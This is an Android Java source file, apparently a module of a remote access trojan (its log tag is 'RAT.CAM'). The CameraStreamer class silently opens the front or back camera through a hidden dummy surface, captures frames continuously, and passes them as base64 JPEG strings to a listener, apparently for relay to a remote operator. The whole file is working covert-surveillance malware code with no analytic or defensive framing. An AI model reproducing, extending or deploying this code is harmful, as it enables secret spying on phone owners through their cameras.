package com.nullx.pp;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;

import java.nio.ByteBuffer;
import java.util.Arrays;

public class CameraStreamer {
    private static final String TAG = "RAT.CAM";

    private static CameraDevice camera;
    private static CameraCaptureSession session;
    private static ImageReader reader;
    private static HandlerThread thread;
    private static Handler handler;
    private static boolean running = false;
    private static Surface dummySurface;
    private static OnFrameListener listener;

    public interface OnFrameListener {
        void onFrame(String base64Jpeg);
    }

    public static void start(Context ctx, String side, OnFrameListener l) {
        if (running) return;
        listener = l;
        running = true;

        thread = new HandlerThread("CamStream");
        thread.start();
        handler = new Handler(thread.getLooper());

        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            int facing = side.equals("front")
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;

            String camId = null;
            for (String id : cm.getCameraIdList()) {
                Integer f = cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == facing) { camId = id; break; }
            }
            if (camId == null) { running = false; return; }

            reader = ImageReader.newInstance(480, 360, ImageFormat.JPEG, 3);
            reader.setOnImageAvailableListener(r -> {
                Image img = r.acquireLatestImage();
                if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    if (listener != null) listener.onFrame(b64);
                } finally { img.close(); }
            }, handler);

            android.graphics.SurfaceTexture st = new android.graphics.SurfaceTexture(0);
            st.setDefaultBufferSize(480, 360);
            dummySurface = new Surface(st);

            final String finalId = camId;
            cm.openCamera(finalId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice c) {
                    camera = c;
                    try {
                        CaptureRequest.Builder b = c.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        b.addTarget(reader.getSurface());
                        b.addTarget(dummySurface);
                        b.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);

                        c.createCaptureSession(Arrays.asList(reader.getSurface(), dummySurface),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession s) {
                                    session = s;
                                    try { s.setRepeatingRequest(b.build(), null, handler); }
                                    catch (Exception e) { Log.e(TAG, "setRepeating: " + e.getMessage()); }
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) {}
                            }, handler);
                    } catch (Exception e) { Log.e(TAG, "capture: " + e.getMessage()); }
                }
                @Override public void onDisconnected(CameraDevice c) { stop(); }
                @Override public void onError(CameraDevice c, int e) { stop(); }
            }, handler);
        } catch (Exception e) {
            Log.e(TAG, "start: " + e.getMessage());
            running = false;
        }
    }

    public static void stop() {
        running = false;
        try { if (session != null) session.close(); } catch (Exception ignored) {}
        try { if (camera != null) camera.close(); } catch (Exception ignored) {}
        try { if (reader != null) reader.close(); } catch (Exception ignored) {}
        try { if (thread != null) thread.quitSafely(); } catch (Exception ignored) {}
        session = null; camera = null; reader = null; thread = null;
    }
}